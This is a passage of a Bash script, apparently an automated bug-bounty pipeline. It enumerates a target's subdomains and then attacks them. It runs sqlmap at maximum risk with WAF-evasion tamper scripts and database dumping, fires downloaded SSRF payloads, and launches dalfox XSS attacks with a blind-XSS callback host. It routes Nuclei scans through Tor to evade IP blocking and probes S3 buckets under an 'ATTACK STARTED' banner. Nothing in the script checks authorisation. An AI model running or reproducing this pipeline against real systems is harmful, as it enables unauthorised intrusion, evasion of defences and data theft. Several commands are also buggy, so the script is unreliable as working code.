			# SecList : you can find others RAFT (medium, large, lowercase, etc.)
			Fuzzing "/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt" "raft-small-directories.txt" $url
			# Jhaddix content discovery
			Fuzzing "https://gist.githubusercontent.com/jhaddix/b80ea67d85c13206125806f0828f4d10/raw/c81a34fe84731430741e0463eb6076129c20c4c0/content_discovery_all.txt" "content_discovery_jhaddix.txt" $url
			# OneListForAll : you can find others lists (micro 18K lines, short 892K lines, full 59B lines)
			Fuzzing "null" "../tools/OneListForAll/onelistforallmicro.txt" $url
		fi


		# TODO : Shortname enum : https://github.com/irsdl/IIS-ShortName-Scanner
		# TODO : Github DORKS Scan + EyeWitness (manue check) / Run .sh extia : https://gist.githubusercontent.com/jhaddix/1fb7ab2409ab579178d2a79959909b33/raw/e9fea4c0f6982546d90d241bc3e19627a7083e5e/Gdorklinks.sh
 
	done < <(cat output_webanalyze.csv)

}

################################
## ENMERATION
##
## Enum. subdomains & IPs based on OSINT
## (API to be configured) & validation URLs & IPs
# 
################################
Enumeration(){
	# Start the timer
	start=$(date +%s)
	# 2. Perform subdomain enumeration (recon-ng, amass, sublist3r)
	################################
	## AMASS
	################################
	SendDiscord "[Discovery] 1. Recon-ng started"
	Recon-ng $targetname $companyname
	SendDiscord "[Enumeration] 2. Make sure to configure tools before launching."
	# Config. file located : ~/.config/amass/config.ini
	# Choice : Active OR Passive ?
	tput bold;echo "Amass active scan ? (without bruteforce) [Y,N] "
	read -r input
	if [[ $input == "Y" || $input == "y" ]]; then
		SendDiscord "[Enumeration] Amass active scan started"
		amass enum --active -d $targetname -o output_amass.txt -v
	else 
		SendDiscord "[Enumeration] Amass passive scan started"
		amass enum --passive -d $targetname -o output_amass.txt -v
	fi
	# Track to see if something new added before our last amass scan
	# TO TRY SUBDOMAINS ENUM. :		Fuzzing "https://gist.githubusercontent.com/jhaddix/f64c97d0863a78454e44c2f7119c2a6a/raw/96f4e51d96b2203f19f6381c8c545b278eaa0837/all.txt" "jhaddix_subdomains.txt" $targetname "subdomains"
	# amass track -d $targetname
	
	################################
	## SUBLIST3R
	################################
	SendDiscord "[Enumeration] 2.2 Sublist3r started"
	sublist3r -d $targetname -o output_sublist3r.txt -v
	
	################################
	## WAYBACKURL
	################################	
	SendDiscord "[Enumeration] 2.3 Waybackurls started"
	#  Use ./../tools/waybackurls/main to gather from the Wayback machine all the URLS since the beginning using the passive technique.
	./../tools/waybackurls/main $targetname > subdomains/output_waybackurls.txt
	cat subdomains/output_waybackurls.txt | httpx -verbose > subdomains/output_waybackurls.txt

	################################
	## WAYMORE & XNLINKFINDER
	################################
	# Config. config.xml includind urlScan API KEY
	SendDiscord "[Enumeration] 2.4 Waymore started"
	#  Use waymore to gather even more URLs from more archive resources, while also logging all the responses in XNL files, which contain even more that we will extract.
	python3 ../tools/waymore/waymore.py -i $targetname -mode B -f -xcc -xus -xav
	mv ../tools/waymore/results/$targetname ./output_waymore
	# Responses in xnl files : (Directory containing the xnl from waymore) = $targetname
	SendDiscord "[Enumeration] 2.4 xnLinkFinder started"
	# We're using the previous output_waymore for this tool
	# Use xnLinkfinder to analyze all the XNL responses saved, and grep out more URLs from the domain in scope.
	python3 ../tools/xnLinkFinder/xnLinkFinder.py -i ./output_waymore -sp https://www.$targetname -sf $targetname -o subdomains/output_xnlinkfinder.txt
	# Only keeping links like 'https://www.' , not 'https://'
	cat subdomains/output_xnlinkfinder.txt | grep "www.$targetname" > subdomains/output_linkfinder_final.txt
	mv subdomains/output_waybackurls.txt output_waymore subdomains/output_linkfinder_final.txt subdomains/output_xnlinkfinder.txt ./urls
	cp ./urls/output_waymore/waymore.txt ./urls/waymore.txt
	# Removing the line numbers from the file
	# sed 's/ *[0-9]*.//'
	

	# 3. Show results fo each to compare
	# 4. Sort all results removing duplicated into one final file
	SendDiscord "[Enumeration] 4. Removing duplicates saved to subdomains.txt"
	if [ -f ./output_sublist3r.txt ]; then 
		echo "File output_sublist3r.txt exists"
	else
		touch ./output_sublist3r.txt
		echo "File output_sublist3r.txt created (was empty)"
	fi
	sort -u output_sublist3r.txt output_amass.txt >> subdomains.txt
	# Move old subdomain files for deeper analysis
	mv output_amass.txt output_sublist3r.txt ./tmp 
	# 5. Probe all subdomains with httpx (-verbose if needed)
	SendDiscord "[Enumeration] 5. HTTPx started from subdomains.txt to url_httpx.txt"
	cat subdomains.txt | httpx -verbose > url_httpx.txt
	SendDiscord "Subdomains number : before httpx (subdomains.txt) $(cat subdomains.txt | sort -u | wc -l), after httpx (url_httpx.txt) $(cat url_httpx.txt | sort -u | wc -l)"
	
	# 6. Convert subdomains into IPs
	SendDiscord "[Enumeration] 6. Subdomains to IPs started"
	echo -e "Convert Domain 2 IP without Duplicates\n"
	if [ -f ./url_httpx_to_ip.txt ]; then 
		echo "File url_httpx_to_ip.txt exists"
	else
		touch ./url_httpx_to_ip.txt
		echo "File url_httpx_to_ip.txt created (new)"
	fi
	if [ -f ./url_httpx.txt ]; then 
		echo "File url_httpx.txt exists"
	else
		touch ./url_httpx.txt
		echo "File url_httpx.txt created (was empty)"
	fi
	SendDiscord "Resolving URL to IP from url_httpx.txt"
	# Looping inside url_httpx for finding IPs
	while read url; do
		# extract url from the list and sed https
		host=$(echo "$url" | sed 's|https\?://||; s|/.*||')
		# save the ip address with the DNS 
		ip=$(host "$host" | awk '/has address/ {print $4}')
		# Check if the ip is valid 
		if ping -c 1 "$ip" >/dev/null 2>&1; then
			echo "$ip" >> url_httpx_to_ip.txt
		fi
	done < url_httpx.txt

	# 7. Check is IP is alive (v2 could integrate reocn-ng cause here we knew with httpx, the IP is valid)
	SendDiscord "[Enumeration] 7. IP is up started"
	while read ip; do
		# Check if the ip is valid 
		if ping -c 1 "$ip" >/dev/null 2>&1; then
			echo "$ip" >> ips_temp.txt
		fi
	done < ips_recon-ng.txt
	# After adding IP from httpx and recon-ng, we're cleaning the list
	cat ips_temp.txt >> url_httpx_to_ip.txt
    rm ips_temp.txt
    sort -u -o url_httpx_to_ip.txt url_httpx_to_ip.txt

	# if [ -f ./ip-valid.txt ]; then 
	# 	echo "File ip-valid.txt exists"
	# else
	# 	touch ./ip-valid.txt
	# 	echo "File ip-valid.txt created - probably caused because url_http.txt is empty, so no subdomains !"
	# fi
	# for foo in $(cat ips_recon-ng.txt) # NE MARCHE QU'AVEC DES IP !! PAS AVEC URL
	# do
	# 	ping -c1 -W1 $foo > /dev/null 2>&1
	# 	if [[ $? -eq 0 ]];
	# 	then
	# 		echo -e "[+]--- VALID ---[+] $foo"
	# 		echo -e "$foo" | tee -a ip-valid.txt > /dev/null 2>&1

	# 	else
	# 		echo -e "[+]--- NOT VALID ---[+] $foo"
	# 		echo -e "$foo" | tee -a ip-notvalid.txt > /dev/null 2>&1
	# 	fi
	# done
	# sort ip-valid.txt | uniq > ip-valid.new
	# mv ip-valid.new ip-valid.txt
	# echo -e ""
	# echo -e "ip-valid.txt and ip-notvalid.txt created"
	vcounter=$(cat url_httpx_to_ip.txt | sort -u | wc -l )
	# fcounter=$(cat ip-notvalid.txt | sort -u | wc -l )
	orgcounter=$(cat url_httpx.txt | sort -u | wc -l )
	SendDiscord "Total hosts (url_httpx.txt): ${orgcounter} , valid ip : ${vcounter}"
	#mv ip-notvalid.txt ips_recon-ng.txt $(pwd)/tmp/

	################################
	## DOMAIN TAKEOVER
	################################
	SendDiscord "[Enumeration] 8. Scanning for domain takeover"
	python3 ../tools/takeover/takeover.py -l url_httpx.txt -t 10 -o output_takerover.txt
	SendDiscord "Saved under output_takerover.txt"

	# Pause for checking errors
	SendDiscord "Please check logs below - then tap to continue"
	read -n 1 -s -r -p "Tap to continue..."
	echo "Continue..."

	################################
	## EYEWITNESS
	################################
	SendDiscord "[Enumeration] 9. Eyewitness for screenshot url_httpx.txt"
	eyewitness -f url_httpx.txt -d output_eyewitness
	SendDiscord "Saved under output_eyewitness"

	# Move files
	mv url_httpx.txt subdomains/url_httpx.txt
	mv ips_recon-ng.txt $(pwd)/ips/

	# Scope
	grep -E $companyname ./subdomains/url_httpx.txt >> ./subdomains/url_httpx_scope.txt


	# Stop the timer
	end=$(date +%s)
	# Calculate the elapsed time
	elapsed=$((end - start))
	hours=$((elapsed / 3600))
	# Print the elapsed time
	echo "? Elapsed time: $hours hours"
}

################################
## PARAM ANALYSIS
##
## Crawl the paramaters with tool like
## paramspider, jsscanner, gf, arjun, sqlmap, xss,ssrf...
## Then check web vuln. (XSS, SQLi, SSRF...)
################################
Params_analysis(){
	################################
	## PARAMSPIDER
	################################	
	SendDiscord "[PARAM ANALYSIS] 1. Paramspider started"
	while read domain; do
		python3 ../tools/ParamSpider/paramspider.py --domain $domain --exclude woff,png,svg,php,jpg
	done < ./subdomains/url_httpx.txt
	# Fill all output in one file
	for file in output/https:/*.txt; do
		cat $file | grep -i $companyname >>	 output_paramspider_all.txt
	done
	for file in output/http:/*.txt; do
		cat $file | grep -i $companyname >> output_paramspider_all.txt
	done
	# Moving files paramSpider
	mv ./output ./params/output_paramspider
	mv  output_paramspider_all.txt ./params
	sed 's/FUZZ//g' ./params/output_paramspider_all.txt > ./params/output_paramspider_without_FUZZ_all.txt

	################################
	## GF (based on ParamSpider)
	################################	
	SendDiscord "[PARAM ANALYSIS] 4. Gf patterns started"
	# eg. https://xxx.fr/oauth2/authorize?response_type=FUZZ
	cat params/output_paramspider_all.txt 2>&1 | httpx -silent | sort -u | tee params/temp.gf | gf xss | tee -a params/gf_xss.txt
	if [ ! -s params/gf_xss.txt ]; then
		echo "Delete gf_xss.txt"
		rm params/gf_xss.txt
	else
		echo "gf_xss.txt exists, searching params xss for meg"
		# eg. https://xxx.fr/oauth2/authorize?response_type=
		# For Meg, we must remove the FUZZ from paramspider and replace it with a null character: sed 's/FUZZ//g' reconfile.txt
		cat params/gf_xss.txt 2>&1 | sed 's/FUZZ//g' | tee params/gf_xss_params_for_meg.txt
		if [ ! -s params/gf_xss_params_for_meg.txt ]; then
			echo "Delete gf_xss_params_for_meg.txt"
			rm params/gf_xss_params_for_meg.txt
		else
			################################
			## MEG
			################################
			# meg -v /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt params/gf_xss_params_for_meg.txt params/lfi_results_meg.txt -s 200
			meg -s 200 -c 10 /usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt params/gf_xss_params_for_meg.txt params/xss_results_meg
			
			rm params/gf_xss_params_for_meg.txt
		fi
	fi
	cat params/output_paramspider_all.txt 2>&1 | httpx -silent | sort -u | tee params/temp.gf | gf sqli | tee -a params/gf_sqli.txt
	if [ ! -s params/gf_sqli.txt ]; then
		echo "Delete gf_sqli.txt"
		rm params/gf_sqli.txt
	fi
	cat params/output_paramspider_all.txt 2>&1 | httpx -silent | sort -u | tee params/temp.gf | gf idor | tee -a params/gf_idor.txt
	if [ ! -s params/gf_idor.txt ]; then
		echo "Delete gf_idor.txt"
		rm params/gf_idor.txt
	fi
	rm params/temp.gf

	# Deleting if nothing found with MEG ... TO BE ADD WITH OTHER MEG
	#	for directory in xss_results_meg dossier2 dossier3; do
	for directory in xss_results_meg; do
  		if [ -d "$directory" ]; then
    		if [ ! -s "$directory/index" ]; then
      			rm -rf "$directory"
    		fi
  		fi
	done


	# cat everything in folders, subfolders
	# Extract .js links and combine with grep
	# CHECK IF IT TAKES JSSCANNER OR PARAMSPIDER OR BOTH ?
	cat * */* */*/* */*/*/* 2>&1 | grep .js > params/output_grep_all_js_links.txt
	# Use GF for manual checking of patterns
	#cat * */* */*/* */*/*/* 2>&1 | gf urls | tee output_grep_all_urls_links.txt
	cat * */* */*/* */*/*/* 2>&1 | gf google-keys_secrets | tee params/output_gf_secrets_all_urls_links.txt
	cat * */* */*/* */*/*/* 2>&1 | gf google-tokens_secrets | tee params/output_gf_secrets_all_urls_links.txt
	cat * */* */*/* */*/*/* 2>&1 | gf mailgun-keys_secrets | tee params/output_gf_secrets_all_urls_links.txt
	cat * */* */*/* */*/*/* 2>&1 | gf mailchimp-keys_secrets | tee params/output_gf_secrets_all_urls_links.txt
	if [ ! -s params/output_grep_all_js_links.txt ]; then
		rm params/output_grep_all_js_links.txt
	fi
	# if [ ! -s output_grep_all_urls_links.txt ]; then
	# 	rm output_grep_all_urls_links.txt
	# fi
	if [ ! -s params/output_gf_secrets_all_urls_links.txt ]; then
		rm params/output_gf_secrets_all_urls_links.txt
	fi
	# etc....gf...
	# Then curl the result and save it to search inside 
	# curl https://extia....js 


	################################
	## ARJUN
	################################
	SendDiscord "[PARAM ANALYSIS]"
	# --stable if needed = thread to 1 | -t for threading
	arjun -i ./subdomains/url_httpx.txt -t 10 --disable-redirects -oT ./params/output_arjun.txt # oJ for json output


	################################
	## JS SCANNER
	################################
	# Scanning Javascript Files for Endpoints, Secrets, Hardcoded credentials,IDOR, Openredirect and more	
	SendDiscord "[PARAM ANALYSIS] 5. JSScanner started"
	./../tools/JSScanner/script.sh ./subdomains/url_httpx.txt 2>&1
	# Moving JS SCANNER
	mv Jsscanner_results params/output_jsscanner


	################################
	## SQLMAP
	################################
	#cat "subdomains/output_waybackurls.txt" | grep -iE '(\?|\=|\&)(id|select|update|union|from|where|insert|delete|into|information_schema)' | sort -u > "params/grep_sql_urls.txt"
	./../tools/waybackurls/main "$targetname" 2>&1 | httpx -verbose 2>&1 | tee "params/urls_temp.txt" | grep -iE '(\?|\=|\&)(id|select|update|union|from|where|insert|delete|into|information_schema)' | sort -u > "params/grep_sql_urls.txt"
	sort -u subdomains/output_waybackurls.txt params/urls_temp.txt > params/temp_waybackurls.txt
	cat "params/temp_waybackurls.txt" | grep -iE '\?' > "params/grep_sql_urls_params.txt"    
	echo -e "Results : temp_waybackurls.txt and grep_sql_urls_params.txt (includes : \?)" | lolcat
	num_urls=$(wc -l "params/temp_waybackurls.txt" | cut -d ' ' -f 1)
	SendDiscord "Found $num_urls ./../tools/waybackurls/main"

	num_sql_urls=$(wc -l "params/grep_sql_urls_params.txt" | cut -d ' ' -f 1)

	# Extract URLs with parameters from Arjun's output
	# if [ -f "subdomains/arjun_output.json" ]; then
	#   cat "subdomains/arjun_output.json" | jq -r '.[] | select(.params != null) | .url' > "subdomains/output_arjun.txt"
	#   # ERROR ME RENVOIE NULL NULL
	# else
	#   touch "subdomains/output_arjun.txt"
	# fi

	# Merge the URLs found by Arjun with the ones ready for SQL injection
	echo "Merging output_arjun.txt and url_httpx.txt" | lolcat
	if test -f "params/output_arjun.txt"; then 
	cat "params/grep_sql_urls.txt" "params/output_arjun.txt" "params/temp_waybackurls.txt" "params/grep_sql_urls_params.txt" 2>&1 | sort -u > "params/sql_final_merge.txt"
	else
	cat "params/grep_sql_urls.txt" > "params/sql_final_merge.txt"; 
	fi

	num_sql_urls2=$(wc -l "params/sql_final_merge.txt" | cut -d ' ' -f 1)
	# Starting SQLMAP
	sqlmap -m "params/sql_final_merge.txt" --risk=3 --smart --hpp --level=5 --random-agent --threads=10 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --skip-urlencode --string "koff75" --forms --dump --dbms=mysql --batch
	echo "/!\ Location where it saves all the results: ~/.local/share/sqlmap/output/" | lolcat

	echo "End of param function" | toilet --metal -f term -F border


	################################
	## SSRF
	################################
	# Combine the two URL lists and filter out irrelevant extensions
	# grep excluding these extensions (png, jpg...)
	cat "params/temp_waybackurls.txt" | grep -E -v '\.(png|jpg|jpeg|gif|pdf|css|js)$' | sort -u > "params/grep_ssrf_urls.txt"
	
	# Test URLs for SSRF
	cat "params/grep_ssrf_urls.txt" | httpx --verbose | sed 's/=.*/=/' | gf ssrf > "params/grep_ssrf_urls2.txt"
	cat params/grep_ssrf_urls2.txt > params/grep_ssrf_urls.txt && rm params/grep_ssrf_urls2.txt
	total=$(wc -l < "params/grep_ssrf_urls.txt")
	echo "Found $total URLs for SSRF..." | lolcat

	# Test URLs for SSRF
	echo "Testing URLs for SSRF vulnerabilities..." | lolcat

	# Loop through each URL and test for SSRF
	wget https://raw.githubusercontent.com/blackhatethicalhacking/SSRFPwned/main/ssrfpayloads.txt -P params/
	while read url; do
		# Extract base URL and parameters from URL
		base_url=$(echo "$url" | awk -F'[?]' '{print $1}')
		params=$(echo "$url" | awk -F'[?]' '{print $2}')

		# Loop through each payload and test for SSRF
		SendDiscord "SSRF checker with ssrfpayloads.txt"
		while read payload; do
			# Inject payload into each parameter and test URL
			full_url="$url$payload"
			echo -ne "[*] Testing $full_url --> "
			response=$(curl -s -o /dev/null -w "%{http_code}" "$full_url")

			if [[ $response == 200 && $(curl -s "$full_url" | grep -q "$payload") ]]; then
				echo -e "\033[0;32mVulnerable\033[0m"
				echo "$full_url" >> "params/ssrf_vulnerable.txt"
			# else
				# echo -e "\033[0;31mNot vulnerable\033[0m"
			fi
		done < "params/ssrfpayloads.txt"
	done < "params/grep_ssrf_urls.txt"

	# Count the number of vulnerable URLs found and print the total
	total_vulnerable=$(wc -l < "params/ssrf_vulnerable.txt")
	SendDiscord "Found $total_vulnerable SSRF vulnerable URLs." | lolcat


	################################
	## HEARBLEED
	################################	
	SendDiscord "[PARAM ANALYSIS] 3. Heartbleed started"
	#cat ./subdomains/url_httpx.txt 2>&1 | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line: safe;	 done
	results=""
	while read line ; do
	if echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep -q 'server extension "heartbeat" (id=15)'; then
		results="$line: heartbeat\n"
	fi
	done < ./subdomains/url_httpx.txt
	if [ -n "$results" ]; then
		echo -e "$results" > output_heartbeat.txt
	fi

	################################
	## GITLEAKS
	################################	
	SendDiscord "[PARAM ANALYSIS] 5. Gitleaks started"
	gitleaks detect --no-git --source params/output_jsscanner

}



Vuln_web_analysis(){
	Send Discord "[VULN. WEB] 1. Dalfox started for xss attacks"
	dalfox file params/gf_xss.txt --silence | tee params/output_dalfox_xss.txt


}
################################
## Vuln_web_analysis_one_liner
##
## One liners for all in one !
## Check vulns on demande
## Dalfox, XSS, ...
################################
Vuln_web_analysis_one_liner() {
	SendDiscord "[VULN. WEB ONE LINER] 1. [METHOD 1] Dalfox started for xss attacks"
	# You don't need to do the param miner etc...
	# Using GoSpider to spider from URLS given, excluding some extensions, replacing payloads while grepping code 200, then Dalfox
	gospider -S params/gf_xss.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee params/output_dalfox_xss_one_liner_1.txt
	# A VOIR CAR c'est -S xss_xoom_params.txt .... ??
	SendDiscord "[VULN. WEB ONE LINER] 1. [METHOD 2] Dalfox started for xss attacks"
	./../tools/waybackurls/main $companyname | gf xss | sed 's/=.*/=/' | sort -u | tee temp_dalfox_oneliner.txt && cat temp_dalfox_oneliner.txt | dalfox -b YOURS.xss.ht pipe > output_dalfox_xss_one_liner_2.txt
	SendDiscord "[VULN. WEB ONE LINER] 1. [METHOD 3] Dalfox started for xss attacks"
	cat params/gf_xss.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"
	SendDiscord "[VULN. WEB ONE LINER] 1. [METHOD 3] Dalfox started for xss attacks"
	cat params/gf_xss.txt | hakrawler | gf xss | dalfox pipe | tee output_dalfox_xss_one_liner_4.txt

	SendDiscord "[VULN. WEB ONE LINER] 2. SQLmap started for sqli attacks"
	sqlmap -m params/gf_sqli.txt --risk=3 --level=5 --random-agent --batch

}
################################
## PORT SCANNING
##
## Host scanning (NMAP, RUSTSCAN)
## 2 steps, first : check quickly open ports
## second : deeper with nmap, and merge everything
################################
Port-scanning(){
	# We can rustscan and pass the output to nmap for checking OS versions etc.
	# rustscan -a ip-valid.txt --ulimit 10000 --range 1-65535
	#das add rustscan '-b 1000 -t 2000 --ulimit 10000 -a hosts.txt --range 1-49151 --scan-order "Random" -g --no-config'
	# 1. Filling the DB - Discover open ports for a bunch of targets
	# das -db koff add -rm rustscan '-b 1000 -t 2000 --ulimit 5000 -a ./extia.fr/ip-valid.txt --range 1-49151 --scan-order "Random" -g --no-config'
	SendDiscord "[Port Scanning] 1. RustScan - Discover open ports with ./ips/url_httpx_to_ip.txt..."
	das -db koff add -rm rustscan '-g -b 1000 -t 2000 --ulimit 5000 -a ./ips/url_httpx_to_ip.txt --range 80-450 --scan-order "Random" --no-config'
	
	SendDiscord "[Port Scanning] 1.1 RustScan - Showing the hosts results..."
	das -db koff scan -hosts all -show
	SendDiscord "[Port Scanning] 1.1 RustScan - Showing the ports results..."
	das -db koff scan -ports all -show

	# 2. Targeted Scanning - Run Nmap individually for each target with version grabbing and NSE actions.
	# das -db koff scan -hosts all -oA report-scan
	SendDiscord "[Port Scanning] 2. Nmap - Each target wuth version grabbing and NSE actions..."
	das -db koff scan -hosts all -oA report-scan -nmap '-Pn -sVC -O'

	# 3. Merging the Reports - Merge the results into a single Nmap report (different formats available).
	SendDiscord "[Port Scanning] 3. RustScan - Merge the results into a final report..."
	das -db koff report -hosts all -oA report-scan

	# Move all nmap reports for using searchsploit
    SendDiscord "Done! All nmap scans saved under ./ips/"
	mv ~/.das/nmap_koff/ ./ips/nmap_reports/
    mv report-scan.nmap report-scan.xml report-scan.html report-scan.gnmap  ./ips
}

# === FINDING CVEs & MISCONFIGS ===
Finding_CVES(){
	################################
	## SEARCHSPLOIT
	################################
	# SendDiscord "1. [Finding CVES] 4. Searchsploit with nmap reports .xml"
	# # for file_report in nmap_reports/*.xml
	# # do
	# # 	tput bold;echo "[SearchSploit] Nmap file : $file_report" | lolcat
	# # 	searchsploit --nmap $file_report
	# # done
	# tput bold;echo "[SearchSploit] Nmap file : ./ips/report-scan.xml" | lolcat
    # # to be added ? : -u for download all files   
	# searchsploit --nmap ./ips/report-scan.xml
	# SendDiscord "Searchsploit : check the below infos manually !"
	# # Maybe put the output in a file ... 

	# ################################
	# ## SN1PER
	# ################################
	# SendDiscord "2. [Finding CVES] 4. Sn1per with url_httpx_to_ip.txt"
	# sudo sniper -f ./ips/url_httpx_to_ip.txt -m airstrike -w output_sniper
    # mv /usr/share/sniper/loot/workspace/output_sniper beelix/vuln/sn1per
	# SendDiscord "Saved under ./vuln/sn1per"

	################################
	## NUCLEI
	################################
    # Nuclei_start
  #   Nuclei_buckets_finds
    GitLeaks_Trufflehog
}



Nuclei_simple_scan(){
		SendDiscord "Nuclei with CVEs only - Simple Scan"
		# Template Nuclei : CVEs ../tools/nuclei-templates/cves.json
		cat ./subdomains/url_httpx.txt | sudo nuclei -t cves -stats -stats-interval 60 -rate-limit-minute 4500 -concurrency 5 -bulk-size 13 -o ./vuln/nuclei_results_cves.txt
		SendDiscord "$(wc -l < ./vuln/nuclei_results_cves.txt) issue(s) found"

		# Template Nuclei : others
		# nuclei -list urls.txt -nt -stats -stats-interval 60 -o nuclei_results_new_templates.txt
		# cat urls.txt | nuclei -t ~/nuclei-templates/vulnerabilities -t ~/nuclei-template/cnvd -stats -stats-interval 60 -rate-limit-minute 4500 -concurrency 5 -bulk-size 13 -o nuclei_results_vulnerability-cnvd.txt

		# If empty file, deleting
		if [ ! -s ./vuln/nuclei_results_cves.txt ]; then
			rm ./vuln/nuclei_results_cves.txt
		fi
}
Nuclei_full_scan(){
	# Ask user if they want to use proxychains before nuclei, to change IP and evade ip blockage 
	SendDiscord "Enable proxychains ? [Y,N]"
	read -r input 
	if [[ $input == "Y" || $input == "y" ]]; then
		SendDiscord "Starting tor network..."
		service tor start
		
		#Start Nuclei with specific templates, you can always modify this based on what you want to took for 
		# ========> NUCLEI PROXY CHAINS <=========
		SendDiscord "Starting Nuclei..."
		proxychains sudo nuclei -list ./subdomains/url_httpx.txt -t ../tools/nuclei-templates/ -stats -stats-interval 60 -o ./vuln/nuclei_results.txt
		# nuclei -list ./subdomains/url_httpx.txt -nt -stats -stats-interval 60 -o nuclei_results_new_templates.txt
	else
		SendDiscord "Without proxychains."
		# ========> NUCLEI WITHOUT TOR <=========
		SendDiscord "Starting Nuclei..."
		cat ./subdomains/url_httpx.txt | sudo nuclei -exclude-templates headless/ -exclude-templates iot/ -exclude-templates workflows/ -exclude-templates fuzzing/ -exclude-templates takeovers/ -stats -stats-interval 60 -o ./vuln/nuclei_results.txt
	fi
	SendDiscord "Scan Nuclei done."

	# filter results and get only low, medium, high, critical
	SendDiscord "Filtering results : LOW-MEDIUM-HIGH-CRITICAL"
	cat ./vuln/nuclei_results.txt | grep -e pulse-secure-panel -e smb-vl-detection -e error-logs -e generic-tokens -e detect-dangling-cname -e default-windows-server-page -e wordpress > ./vuln/important_info.txt
	cat ./vuln/nuclei_results.txt | grep -F "[low]" > ./vuln/nuclei_results_low.txt
	cat ./vuln/nuclei_results.txt | grep -F "[medium]" > ./vuln/nuclei_results_medium.txt
	cat ./vuln/nuclei_results.txt | grep -F "[high]" > ./vuln/nuclei_results_high.txt
	cat ./vuln/nuclei_results.txt | grep -F "[critical]" > ./vuln/nuclei_results_critical.txt
	SendDiscord "Full template Nuclei done"
	#Check if user is using an rpi or not and proceed accordingly to sending notification. 
	SendDiscord "$(wc < ./vuln/important_info.txt) IMPORTANT INFO ISSUES FOUND."
	notify -data ./vuln/important_info.txt -bulk -silent
	SendDiscord "$(wc < ./vuln/nuclei_results_low.txt) LOW ISSUES FOUND."
	notify -data ./vuln/nuclei_results_low.txt -bulk -silent
	SendDiscord "$(wc < ./vuln/nuclei_results_medium.txt) MEDIUM ISSUES FOUND."
	notify -data ./vuln/nuclei_results_medium.txt -bulk -silent
	SendDiscord "$(wc < ./vuln/nuclei_results_high.txt) HIGH ISSUES FOUND."
	notify -data ./vuln/nuclei_results_high.txt -bulk -silent
	SendDiscord "$(wc < ./vuln/nuclei_results_critical.txt) CRITICAL ISSUES FOUND."
	notify -data ./vuln/nuclei_results_critical.txt -bulk -silent
	SendDiscord "Saved under : ./vuln/nuclei_results.txt & separated by severities"
	sleep 0.5
}
Nuclei_buckets_finds(){
	#perform bucket grepping using grep regex
	tput bold;echo "=== Starting Amazon S3 Bucket ===" | lolcat
	sleep 2
	cat ./vuln/nuclei_results.txt | grep s3 | awk '{print $6}' | awk -F'https://' '{print $2}' > bucketsl.txt
	cat ./vuln/nuclei_results.txt | grep %c0 | awk '{print $6}' | awk -F'https://' '{print $2}' > buckets2.txt
	cat bucketsl.txt buckets2.txt > ./vuln/buckets.txt
	rm bucketsl.txt buckets2.txt
	sleep 0.5
    # If the buckets file is not empty proceeds 
    if [ -s "./vuln/buckets.txt" ]; then
        tput bold;echo "Buckets found : $(wc -l < ./vuln/buckets.txt) !" | lolcat
        SendDiscord "Buckets found : $(wc -l < ./vuln/buckets.txt) !" 
        sleep 1
        tput bold;echo "$Buckets found : $(wc -l < ./vuln/buckets.txt) !" | lolcat
        SendDiscord "Buckets found : $(wc -l < ./vuln/buckets.txt) !"
        notify -data ./vuln/buckets.txt -bulk -silent 
        tput bold;echo "PROCEEDING WITH BUCKET ATTACKS - EVEN IF NOTHING IS FOUND..." | lolcat
        tput bold;echo "ATTACK STARTED!" | lolcat
        cat ./vuln/buckets.txt | while read line
        do
            tput bold;echo "$line" "Checking ACL, public listing, loc, etc." | lolcat
            aws s3 ls s3://$line --recursive 
            /usr/bin/aws s3api get-bucket-acl --bucket $line
            /usr/bin/aws s3api get-bucket-location --bucket $line
            /usr/bin/aws s3api get-bucket-website --bucket $line
            /usr/bin/aws s3api get-bucket-replication --bucket $line
            /usr/bin/aws s3api get-bucket-cors --bucket $line
            /usr/bin/aws s3api get-bucket-policy --bucket $line
        done
        tput bold;echo "Check manually please !" | lolcat
    else 
        rm ./vuln/buckets.txt
        tput bold;echo "No bucket found for Amazon S3" | lolcat
    fi
}
Nuclei_start(){
	# Nuclei updating
    clear
	tput bold;echo "Nuclei is starting..."
	sudo nuclei -update && sudo nuclei -ut
	tput bold;echo "Nuclei updated"
	tput bold;echo "URLS : $(wc -l < ./subdomains/url_httpx.txt) founds"
	sleep 1
	tput bold;echo "Quick Nuclei scan with CVEs only ? If no, starting full template scan. [Y,N]" | lolcat
	read -r input
	if [[ $input == "Y" || $input == "y" ]]; then
		Nuclei_simple_scan
	else 
		Nuclei_full_scan
	fi
}
GitLeaks_Trufflehog(){
	# Gitleaks
	tput bold;echo "Starting GitLeaks" | lolcat
	tput bold;echo "Put this format : https://github.com/insecure/repo" | lolcat
	read -r gitleakrepo
	tput bold;echo "Starting with $gitleakrepo" | lolcat
	gitleaks detect $gitleakrepo -v > gitleak-report.txt
	tput bold;echo "Finished. Saved under gitleak-report.txt" | lolcat
	# Trufflehog
	tput bold;echo "Starting Trufflehog" | lolcat
	tput bold;echo "Put this format : https://github.com/dxa4481/truffleHog.git" | lolcat
	read -r trufflerepo
	tput bold;echo "Starting with $trufflerepo" | lolcat
	./../tools/trufflehog --regex --entropy=False $trufflerepo > trufflehog-report.txt
	tput bold;echo "Finished. Saved under trufflehog-report.txt" | lolcat
	# Move file to directory
	mv -t $targetname trufflehog-report.txt gitleak-report.txt
}
XSS_detection(){
 echo "encours"
}
High_known_CVES(){
	./../tools/waybackurls/main $domain | grep -E "\.js$|\.php$|\.yml$|\.env$|\.txt$|\.xml$|\.config$" | httpx -silent | sort -u | tee high_known_cves_urls.txt lolcat
	mv high_known_cves_urls.txt > ./subdomains/high_known_cves_urls.txt
	count=$(wc -l < ./subdomains/high_known_cves_urls.txt)
	echo "Total URLs found: $count" | lolcat

